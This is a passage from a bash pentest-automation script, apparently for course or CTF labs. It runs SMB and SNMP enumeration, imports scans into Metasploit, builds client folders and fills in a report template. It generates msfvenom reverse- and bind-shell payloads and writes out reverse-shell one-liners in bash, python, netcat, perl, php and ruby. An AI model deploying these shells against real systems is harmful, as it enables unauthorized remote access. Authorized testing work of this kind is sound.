			echo $txtgry"[!] No open ports found for $ip_address, skipping smb enumeration"$txtrst
			$sleeps
		else
			if [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst ]; then
				echo $txtgry"[!] No open TCP ports found for $ip_address, skipping!"$txtrst
				$sleeps
			else
				if grep -w -q "139\|445" $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst; then
					echo $txtblu"[i] Running enum4linux on $ip_address"$txtgry
					enum4linux $ip_address | tee $custom_path$client_name/targets/$ip_address/scans/smb/enum4linux.txt
					$sleeps
				else
					echo $txtgry"[!] No default SMB ports found for $ip_address (TCP)"$txtrst
					$sleeps
				fi
			fi
			if [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst ]; then
				echo $txtgry"[!] No open UDP ports found for $ip_address, skipping!"$txtrst
				$sleeps
			else
				if grep -w -q "137" $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst; then
					echo $txtblu"[i] Running enum4linux on $ip_address"$txtgry
					enum4linux $ip_address | tee $custom_path$client_name/targets/$ip_address/scans/smb/enum4linux.txt
					$sleeps
				else
					echo $txtgry"[!] No default SMB ports found for $ip_address (UDP)"$txtrst
					$sleeps
				fi
			fi
		fi
	done
}

snmp_scan()
{
	for ip_address in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
    	echo $txtblu$txtbld"[i] Performing SNMP enumeration $ip_address"$txtrst
		if [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_tcp_ports.lst ] && [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst ]; then
			echo $txtgry"[!] No open ports found for $ip_address, skipping SNMP enumeration"$txtrst
			$sleeps
		else
			if [ ! -f $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst ]; then
				echo $txtgry"[!] No open TCP ports found for $ip_address, skipping!"$txtrst
					$sleeps
			else
				if grep -w -q "161" $custom_path$client_name/targets/$ip_address/scans/.open_ports/open_udp_ports.lst; then
					echo $txtblu"[i] Running snmp-check on $ip_address"$txtgry
					snmp-check $ip_address -w | tee $custom_path$client_name/targets/$ip_address/scans/snmp.txt
					$sleeps
				else
					echo $txtgry"[!] No default SNMP ports found for $ip_address"$txtrst
						$sleeps
				fi
			fi
		fi
	done
}

msf_import()
{
	echo $txtblu$txtbld"[i] Creating metasploit resource script to create new workspace and import nmap scans"$txtrst$txtgry
	echo "workspace -a $client_name" | tee -a $custom_path$client_name/scripts/msfconsole_$client_name.rc &> /dev/null
	echo "workspace $client_name" | tee -a $custom_path$client_name/scripts/msfconsole_$client_name.rc &> /dev/null
	echo "db_import $custom_path$client_name/targets/*/scans/nmap/*.xml" | tee -a $custom_path$client_name/scripts/msfconsole_$client_name.rc &> /dev/null
	echo "exit" | tee -a $custom_path$client_name/scripts/msfconsole_$client_name.rc &> /dev/null
	service postgresql start && msfconsole -q -r $custom_path$client_name/scripts/msfconsole_$client_name.rc &> /dev/null && echo $txtgrn"[+] Imported $txtbld$client_name$txtrst$txtgrn into MSF!"$txtgry && service postgresql stop
	$sleeps
}

msf_payloads()
{
	# must be called after 1st stage of build_env()
	echo $txtblu$txtbld"[i] Creating some payloads in python format, without the bad characters: $bad_chars, see: file://$custom_path$client_name/generated_payloads/"$txtrst$txtgry
	echo $txtgry" -  Creating Windows pop calc payload"$txtrst
	echo "msfvenom -p windows/exec cmd=calc.exe R --platform windows -a x86 -b '$bad_chars' -f python -v shellcode" > $custom_path$client_name/generated_payloads/popcalc-shellcode.txt
	msfvenom -p windows/exec cmd=calc.exe R --platform windows -a x86 -b '$bad_chars' -f python -v shellcode &>> $custom_path$client_name/generated_payloads/popcalc-shellcode.txt
	echo $txtgry" -  Creating Windows TCP reverse shell payload"$txtrst
	echo "msfvenom -p windows/shell_reverse_tcp LHOST=$local_ip LPORT=$shell_port --platform windows -a x86 -b '$bad_chars' -f python -v shellcode EXITFUNC=thread" > $custom_path$client_name/generated_payloads/win_reverse_tcp_$local_ip-$shell_port-shellcode.txt
	msfvenom -p windows/shell_reverse_tcp LHOST=$local_ip LPORT=$shell_port --platform windows -a x86 -b '$bad_chars' -f python -v shellcode EXITFUNC=thread &>> $custom_path$client_name/generated_payloads/win_reverse_tcp_$local_ip-$shell_port-shellcode.txt
	echo $txtgry" -  Creating Windows TCP bind shell payload"$txtrst
	echo "msfvenom -p windows/shell_bind_tcp LPORT=$shell_port --platform windows -a x86 -b '$bad_chars' -f python -v shellcode" > $custom_path$client_name/generated_payloads/win_bind_$shell_port-shellcode.txt
	msfvenom -p windows/shell_bind_tcp LPORT=$shell_port --platform windows -a x86 -b '$bad_chars' -f python -v shellcode &>> $custom_path$client_name/generated_payloads/win_bind_$shell_port-shellcode.txt
	echo $txtgry" -  Creating Linux TCP bind shell payload"$txtrst # TODO
	echo $txtgry" -  Creating Linux TCP bind shell payload"$txtrst # TODO
}

rev_shells()
{
	echo -e $txtblu$txtbld"[i] Generating some simple reverse-shell one-liners using $local_ip, port $shell_port, see: file://$custom_path$client_name/generated_shells/"$txtrst
	$sleeps
	echo -e $txtgry" -  Adding bash reverse shell"$txtrst
	echo -e "bash -i >& /dev/tcp/$local_ip/ $shell_port 0>&1" > $custom_path$client_name/generated_shells/bash_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding python reverse shell"$txtrst
	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$local_ip\"$shell_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $custom_path$client_name/generated_shells/python_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding netcat.exe reverse shell"$txtrst
	echo -e "netcat.exe -e cmd.exe $local_ip $shell_port" > $custom_path$client_name/generated_shells/netcat_win_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding nc reverse shell"$txtrst
	echo -e "nc -e /bin/sh $local_ip $shell_port" > $custom_path$client_name/generated_shells/nc_lin_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding named pipe reverse shell"$txtrst
	echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $local_ip $shell_port >/tmp/f" > $custom_path$client_name/generated_shells/nc_named_pipe_bash_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding perl reverse shell"$txtrst
	echo -e "perl -e 'use Socket;\$i=\"$local_ip\";\$p=$shell_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > $custom_path$client_name/generated_shells/perl_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding php reverse shell"$txtrst
	echo -e "php -r '\$sock=fsockopen(\"$local_ip\",$shell_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > $custom_path$client_name/generated_shells/php_reverse_tcp.txt
	$sleeps
	echo -e $txtgry" -  Adding ruby reverse shell"$txtrst
	echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$local_ip\",$shell_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > $custom_path$client_name/generated_shells/ruby_reverse_tcp.txt
}

# Build working environment
build_env()
{
	build_initial()
	{
		if [ ! -d $custom_path$client_name ]; then
			echo $txtblu$txtbld"[i] Building initial environment"$txtrst$txtgry
			$sleeps
			mkdir $custom_path$client_name
			echo " -  Creating directory: file://$custom_path$client_name/"
			$sleeps
			mkdir $custom_path$client_name/targets
			echo " -  Creating directory: file://$custom_path$client_name/targets/"
			$sleeps
			mkdir $custom_path$client_name/network_scans
			echo " -  Creating directory: file://$custom_path$client_name/network_scans/"
			$sleeps
			mkdir $custom_path$client_name/pot
			echo " -  Creating directory: file://$custom_path$client_name/pot/"
			$sleeps
			mkdir $custom_path$client_name/pot/credentials
			echo " -  Creating directory: file://$custom_path$client_name/pot/credentials/"
			$sleeps
			mkdir $custom_path$client_name/scripts
			echo " -  Creating directory: file://$custom_path$client_name/scripts/"
			$sleeps
			mkdir $custom_path$client_name/generated_payloads
			echo " -  Creating directory: file://$custom_path$client_name/generated_payloads/"
			$sleeps
			mkdir $custom_path$client_name/generated_shells
			echo " -  Creating directory: file://$custom_path$client_name/generated_shells/"
			$sleeps
			mkdir $custom_path$client_name/screenshots
			echo " -  Creating directory: file://$custom_path$client_name/screenshots/"
			$sleeps
		else
			echo $txtblu"[!] $custom_path$client_name environment already exists, quitting!"$txtrst
			echo ""
			$sleeps
			exit 1
		fi
	}
	if [ -d $custom_path ]; then
		build_initial
	else
		echo $txtblu"[!] $custom_path does not exist, would you like to create it?"$txtrst
		echo ""
		$sleeps
		if [ -z "$force" ]; then
			continue_quit
		fi
		mkdir $custom_path
		if [ $? -eq 1 ]; then
			echo $txtblu"[!] Cannot create $custom_path... quitting!"$txtrst
			exit 1
		else
			build_initial
		fi
	fi
	# Run through found IP list and make default directories within target directories
	if [ ! -f $custom_path$client_name/network_scans/found_ips.lst ]; then
		network_sweep
		for target_ip in $(cat $custom_path$client_name/network_scans/found_ips.lst); do
			echo $txtblu$txtbld"[i] Building target environment for $target_ip"$txtrst$txtgry
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/scans
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/scans/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/scans/.open_ports # hidden
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/scans/.open_ports/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/scans/web
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/scans/web/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/scans/nmap
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/scans/nmap/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/scans/smb
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/scans/smb/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/credentials
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/credentials/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/exploits
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/exploits/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/payloads
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/payloads/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/retrieved_files
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/retrieved_files/"
			$sleeps
			mkdir $custom_path$client_name/targets/$target_ip/screenshots
			echo " -  Creating directory: file://$custom_path$client_name/targets/$target_ip/screenshots/"
			$sleeps
			# Now create some template files
			echo $txtblu"[i] Creating template files"
			$sleeps
			# Create notes.txt and insert comments to separate
			echo $txtgry" -  Creating template: file://$custom_path$client_name/targets/$target_ip/notes.txt"
			echo -e "### $target_ip notes ###\n\n\n\n\n\n# CREDS #\n\n\n\n# SYSTEM #\n\n\n\n# NETWORK #\n\n\n\n# OTHER #\n\n\n\n" >> $custom_path$client_name/targets/$target_ip/notes.txt
			$sleeps
		done
	else
	echo $txtblu"[!] found_ips.lst already exists, skipping target creation!"$txtrst
	$sleeps
	fi
}

givemeallyougot()
{
	if [ -z "$force" ]; then
		echo $txtblu$txtbld"[!] Is this what you really want?"$txtrst
		echo $txtgry" -  Network interface:$txtyel $network_interface"$txtrst
		echo $txtgry" -  IP address is:$txtyel $local_ip$txtgry - copied to clipboard :)"$txtrst
		echo -n "$local_ip" | xclip -selection clipboard
		echo $txtgry" -  Omitting IP address:$txtred $ip_omit"$txtrst
		echo $txtgry" -  Target(s):$txtyel $target_range"$txtrst
		echo $txtgry" -  Client name:$txtyel $client_name"$txtrst
		echo $txtgry" -  Path:$txtyel $custom_path"$txtrst
		[ -z "$domain" ] || echo $txtgry" -  Domain:$txtyel $domain"$txtrst
		echo $txtgry" -  Top TCP ports:$txtyel $top_ports_tcp"$txtrst
		echo $txtgry" -  Top UDP ports:$txtyel $top_ports_udp"$txtrst
		echo $txtgry" -  Nmap scan speed:$txtyel $scan_speed"$txtrst
		echo $txtgry" -  Buster wordlist:$txtyel $buster_wordlist"$txtrst
		echo $txtgry" -  Buster extensions:$txtyel $buster_extensions_path"$txtrst
		[ -z "$dubdub_buster" ] || echo $txtgry" -  Gobuster Threads:$txtyel $(echo $gobuster_threads | cut -d ' ' -f 2)"$txtrst
		continue_quit
	fi
}

gobuster_threads="-t 20" # default: -t 10
nikto_timeout="-timeout 5" # Adjust depending on network speed, if fast: "-timeout 1", slow: "-timeout 10"
sleeps="sleep 0.1" # default: sleep 0.1 # I like sleeps!

screenshot_save() # Set default screenshot save directory
{
	# Use with caution! if folder is deleted or renamed and then you try to take a screenshot using screenshot-tool extension, it will crash and may force a logout!
	echo $txtblu$txtbld"[!] Setting screenshot save location to: file://$txtbld$custom_path$client_name/screenshots"$txtrst
	dconf write /org/gnome/shell/extensions/screenshot/save-location "'$custom_path$client_name/screenshots'"
	dconf write /org/gnome/gnome-screenshot/auto-save-directory "'$custom_path$client_name/screenshots'"
	dconf write /org/gnome/gnome-screenshot/last-save-directory "'$custom_path$client_name/screenshots'"
	# imagemagick?
	$sleeps
}

report_custom() # Download .odt report template from GitHub and update / add relevant fields
{
	# need a better way of searching and replacing, currently using ~ as a delimeter but have now found it in a scan so it breaks... FIXME
	# Will need to add a function to take user input questions like email, tester name, url etc. to add into the report... TODO

	### REPORT VARIABLES ### # defaults if nothing specified
	tester_name="$(echo "OS-13337" | awk '{print toupper($0)}')" # this one is harcoded for now but will use the -T flag in future
	report_title="$(echo -n "$client_name - Pentest Report" | awk '{print toupper($0)}')" # Penetration Test Report? Security Review?
	header_left="$report_title"
	header_right="$tester_name"
	email="your@email.io"
	tester_url="your-url.io" # default if nothing specified

	# KEYWORDS USED IN REPORT TEMPLATE #

	# HEADER-LEFT # 30 characters max
	# HEADER-RIGHT # 30 characters max
	# FOOTER-EMAIL-LINK
	# FOOTER-EMAIL # 30 characters max
	# FP-REPORT-TITLE
	# FP-EMAIL
	# FP-TESTER
	# FP-DATE
	# FP-BINARY-LINK
	# TESTER-NAME
	# IP-HOSTNAME
	# PROPERTIES-TITLE

	if [ -z $enable_report ]; then
		echo $txtblu$txtbld"[!] Report not requested, skipping..."$txtrst &> /dev/null
	else
		echo $txtblu$txtbld"[!] Setting up penetration test report template"$txtrst
		mkdir $custom_path$client_name/report
		echo $txtgry" -  Creating directory: $custom_path$client_name/report/"$txtrst
		$sleeps
		# download report template from github TODO - add a report template to download and update the links below
		echo $txtgry" -  Downloading report template from GitHub"$txtgry
		wget https://github.com/rijidpish/pentidy/blob/master/report-file.odt?raw=true -O $custom_path$client_name/report/report-$client_name.odt &> /dev/null && echo " $txtgrn$txtchk$txtgry  Got: file://$custom_path$client_name/report/report-$client_name.odt" || echo "$txtred$txtcro$txtgry  Unable to download template!"$txtrst
		# wget http://localhost/secret/report-file.odt -O $custom_path$client_name/report/report-$client_name.odt &> /dev/null && echo " -  Got: file://$custom_path$client_name/report/report-$client_name.odt" || echo "$txtred $txtcro$txtgry  Unable to download template!"$txtrst # Just for local testing
		# cp ./report-file.odt $custom_path$client_name/report/report-$client_name.odt && echo " -  Got: file://$custom_path$client_name/report/report-$client_name.odt" || echo "$txtred $txtcro$txtgry  Unable to find template locally!"$txtrst
		$sleeps
		if [ ! -s $custom_path$client_name/report/report-$client_name.odt ]; then
			echo $txtgry" -  Something went wrong, no report found, skipping..."$txtrst # lies!
			if [ -f $custom_path$client_name/report/report-$client_name.odt ]; then
				rm  $custom_path$client_name/report/report-$client_name.odt
				rmdir $custom_path$client_name/report
			fi
		else
			echo $txtgry" -  Preparing the report"$txtrst
			unzip $custom_path$client_name/report/report-$client_name.odt -u content.xml &> /dev/null
			unzip $custom_path$client_name/report/report-$client_name.odt -u styles.xml &> /dev/null
			unzip $custom_path$client_name/report/report-$client_name.odt -u meta.xml &> /dev/null
			$sleeps

			# Header stuff and hyperlinks are stored in style.xml, document properties in meta.xml, content in... content.xml
			echo -n $txtgry" -  Updating Content"
			sed -i "s/FP-REPORT-TITLE/$report_title/g" content.xml
			echo -n "."
			$sleeps
			sed -i "s/FP-TESTER/$tester_name/g" content.xml
			echo -n "."
			$sleeps
			sed -i "s/FP-EMAIL/$email/g" content.xml
			echo -n "."
			$sleeps
			sed -i "s/FP-DATE/$(date +"%d %B %Y")/g" content.xml
			echo -n "."
			$sleeps
			sed -i "s/TESTER-NAME/$tester_name/g" content.xml
			echo -n "."
			$sleeps
			sed -i "s/FP-BINARY-LINK/$tester_url/g" styles.xml
			echo -n "."
			$sleeps
			sed -i "s/HEADER-LEFT/$header_left/g" styles.xml
			echo -n "."
			$sleeps
			sed -i "s/HEADER-RIGHT/$header_right/g" styles.xml
			echo -n "."
			$sleeps
			sed -i "s/FOOTER-EMAIL-LINK/$email/g" styles.xml
			echo -n "."
			$sleeps
			sed -i "s/FOOTER-EMAIL/$email/g" styles.xml
			echo -n "."
			$sleeps
			sed -i "s/TESTER-NAME/$tester_name/g" styles.xml
			echo -n "."
			$sleeps
			sed -i "s/PROPERTIES-TITLE/$report_title/g" meta.xml
			echo -n "."
			$sleeps
			count=1
			for target in $(ls $custom_path$client_name/targets/ | sort -V); do
				# For each target in targets folder, search for <tits/> tag and replace it with $new_content and change the $target each time while your at it
				#((count=count+1)) # (echo $count) may need to be placed where a change is needed in an id? but apparently not...
				new_content="<text:h text:style-name=\"P48\" text:outline-level=\"2\"/><text:h text:style-name=\"P49\" text:outline-level=\"2\"><text:bookmark-start text:name=\"__RefHeading___Toc12579_655797423\"/>$target<text:bookmark-end text:name=\"__RefHeading___Toc12579_655797423\"/></text:h><text:h text:style-name=\"P53\" text:outline-level=\"3\"><text:bookmark-start text:name=\"__RefHeading___Toc5249_83834842216\"/><text:span text:style-name=\"T36\">Information</text:span> Gathering<text:bookmark-end text:name=\"__RefHeading___Toc5249_83834842216\"/></text:h><text:p text:style-name=\"P21\">Nmap <text:span text:style-name=\"T44\">s</text:span>can <text:span text:style-name=\"T44\">results</text:span>...</text:p><nmap/><text:h text:style-name=\"P55\" text:outline-level=\"3\"><text:bookmark-start text:name=\"__RefHeading___Toc728_2106092159196215\"/>Service Enumeration<text:bookmark-end text:name=\"__RefHeading___Toc728_2106092159196215\"/></text:h><text:p text:style-name=\"P22\">Nikto scans, vuln scans, exploit searching, enumeration...</text:p><web_scan/><text:p text:style-name=\"P22\"/><text:h text:style-name=\"P56\" text:outline-level=\"3\"><text:bookmark-start text:name=\"__RefHeading___Toc730_2106092159196216\"/>Penetration<text:bookmark-end text:name=\"__RefHeading___Toc730_2106092159196216\"/></text:h><table:table table:name=\"Vulnerability_Table\" table:style-name=\"Vulnerability_5f_Table\"><table:table-column table:style-name=\"Vulnerability_5f_Table.A\"/><table:table-column table:style-name=\"Vulnerability_5f_Table.B\"/><table:table-column table:style-name=\"Vulnerability_5f_Table.C\"/><table:table-column table:style-name=\"Vulnerability_5f_Table.D\"/><table:table-row table:style-name=\"Vulnerability_5f_Table.1\"><table:table-cell table:style-name=\"Vulnerability_5f_Table.A1\" office:value-type=\"string\"><text:p text:style-name=\"P29\">Severity</text:p></table:table-cell><table:table-cell table:style-name=\"Vulnerability_5f_Table.A1\" office:value-type=\"string\"><text:p text:style-name=\"P31\">CVE</text:p></table:table-cell><table:table-cell table:style-name=\"Vulnerability_5f_Table.A1\" office:value-type=\"string\"><text:p text:style-name=\"P30\">Vulnerability <text:span text:style-name=\"T33\">Summary</text:span></text:p></table:table-cell><table:table-cell table:style-name=\"Vulnerability_5f_Table.D1\" office:value-type=\"string\"><text:p text:style-name=\"P30\">Fix <text:span text:style-name=\"T34\">Summary</text:span></text:p></table:table-cell></table:table-row><table:table-row table:style-name=\"Vulnerability_5f_Table.1\"><table:table-cell table:style-name=\"Vulnerability_5f_Table.A2\" office:value-type=\"string\"><text:p text:style-name=\"P34\">HIGH</text:p></table:table-cell><table:table-cell table:style-name=\"Vulnerability_5f_Table.B2\" office:value-type=\"string\"><text:p text:style-name=\"P37\"><text:span text:style-name=\"T32\">CVE-2008-4250</text:span><text:span text:style-name=\"T32\"><text:note text:id=\"ftn1\" text:note-class=\"footnote\"><text:note-citation>1</text:note-citation><text:note-body><text:p text:style-name=\"Footnote\"><text:a xlink:type=\"simple\" xlink:href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\" text:style-name=\"Internet_20_link\" text:visited-style-name=\"Visited_20_Internet_20_Link\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</text:a> </text:p></text:note-body></text:note></text:span></text:p></table:table-cell><table:table-cell table:style-name=\"Vulnerability_5f_Table.C2\" office:value-type=\"string\"><text:p text:style-name=\"P35\">The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1...</text:p></table:table-cell><table:table-cell table:style-name=\"Vulnerability_5f_Table.D2\" office:value-type=\"string\"><text:p text:style-name=\"P33\"><text:span text:style-name=\"T42\">We recommend </text:span>to apply the <text:span text:style-name=\"T17\">MS08-067</text:span><text:span text:style-name=\"T17\"><text:note text:id=\"ftn2\" text:note-class=\"footnote\"><text:note-citation>2</text:note-citation><text:note-body><text:p text:style-name=\"Footnote\"><text:a xlink:type=\"simple\" xlink:href=\"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067\" text:style-name=\"Internet_20_link\" text:visited-style-name=\"Visited_20_Internet_20_Link\">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067</text:a> </text:p></text:note-body></text:note></text:span> update<text:span text:style-name=\"T38\"> </text:span>immediately.</text:p></table:table-cell></table:table-row></table:table><text:p text:style-name=\"P24\"/><text:p text:style-name=\"P23\">How was the host exploited, step by step <text:span text:style-name=\"T45\">with purty pictures</text:span>...</text:p><text:p text:style-name=\"P23\"/><text:h text:style-name=\"P55\" text:outline-level=\"3\"><text:bookmark-start text:name=\"__RefHeading___Toc832_210609215996216\"/>Maintaining Access<text:bookmark-end text:name=\"__RefHeading___Toc832_210609215996216\"/></text:h><text:p text:style-name=\"P23\">Our exploit<text:span text:style-name=\"T41\">ation</text:span> <text:span text:style-name=\"T41\">process for this host </text:span>is <text:span text:style-name=\"T46\">repeatable and therefore, does </text:span>not require any further acce<text:span text:style-name=\"T47\">ss to be enabled.</text:span></text:p><text:h text:style-name=\"P54\" text:outline-level=\"3\"><text:bookmark-start text:name=\"__RefHeading___Toc5663_83834842216\"/><text:span text:style-name=\"T29\">House </text:span><text:span text:style-name=\"T36\">Cleaning</text:span><text:bookmark-end text:name=\"__RefHeading___Toc5663_83834842216\"/></text:h><text:p text:style-name=\"Text_20_body\"><text:bookmark-start text:name=\"__RefHeading___Toc925_3196174468\"/>All accounts and exploits would be removed from the system and also documented in this section, but for the purposes of this course/<text:span text:style-name=\"T48\">challenge</text:span>, this section is just here for consistency, the machine will be reverted to it\&apos;s original state.<text:bookmark-end text:name=\"__RefHeading___Toc925_3196174468\"/></text:p><tits/>"
				sed -i "s|<tits/>|$new_content|g" content.xml
				# This was lemon difficults to get working! a major cunt of a thing! worth it though
				if [ -f $custom_path$client_name/targets/$target/scans/nmap/nmap-version-tcp.nmap ]; then
					nmap_version_tcp="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-version-tcp.nmap | sed 's~	 ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<nmap/>~<text:p text:style-name=\"T23\">Results from nmap version scan (TCP)</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nmap_version_tcp"'</text:p><text:p text:style-name=\"T23\"/><nmap/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/nmap/nmap-version-udp.nmap ]; then
					nmap_version_udp="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-version-udp.nmap | sed 's~	 ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<nmap/>~<text:p text:style-name=\"T23\">Results from nmap version scan (UDP)</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nmap_version_udp"'</text:p><text:p text:style-name=\"T23\"/><nmap/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/nmap/nmap-os-tcp.nmap ]; then
					nmap_os_tcp="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-os-tcp.nmap | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<nmap/>~<text:p text:style-name=\"T23\">Results from nmap OS scan (TCP)</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nmap_os_tcp"'</text:p><text:p text:style-name=\"T23\"/><nmap/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/nmap/nmap-default-scripts-tcp.nmap ]; then
					nmap_scripts_tcp="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-default-scripts-tcp.nmap | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<nmap/>~<text:p text:style-name=\"T23\">Results from nmap default scripts scan (TCP)</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nmap_scripts_tcp"'</text:p><text:p text:style-name=\"T23\"/><nmap/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/nmap/nmap-default-scripts-udp.nmap ]; then
					nmap_scripts_udp="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-default-scripts-udp.nmap | sed 's~	 ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<nmap/>~<text:p text:style-name=\"T23\">Results from nmap default scripts scan (UDP)</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nmap_scripts_udp"'</text:p><text:p txt:style-name=\"T23\"/><nmap/>~' content.xml
					echo -n "."
					$sleeps
				fi
				sed -i "s~<nmap/>~~g" content.xml # Finish up by making sure to remove the <nmap/> tag so it's not found on the next loop
				echo -n "."
				$sleeps
				if [ -f $custom_path$client_name/targets/$target/scans/web/nikto-80.txt ]; then
					nikto_80="$(cat $custom_path$client_name/targets/$target/scans/web/nikto-80.txt | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<web_scan/>~<text:p text:style-name=\"T23\">Results from nikto scan on port 80</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nikto_80"'</text:p><text:p text:style-name=\"T23\"/><web_scan/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/web/nikto-443.txt ]; then
					nikto_443="$(cat $custom_path$client_name/targets/$target/scans/web/nikto-443.txt | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<web_scan/>~<text:p text:style-name=\"T23\">Results from nikto scan on port 443</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$nikto_443"'</text:p><text:p text:style-name=\"T23\"/><web_scan/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/web/dirb-80.txt ]; then
					dirb_80="$(cat $custom_path$client_name/targets/$target/scans/web/dirb-80.txt | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<web_scan/>~<text:p text:style-name=\"T23\">Results from dirb scan on port 80</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$dirb_80"'</text:p><text:p text:style-name=\"T23\"/><web_scan/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/web/dirb-443.txt ]; then
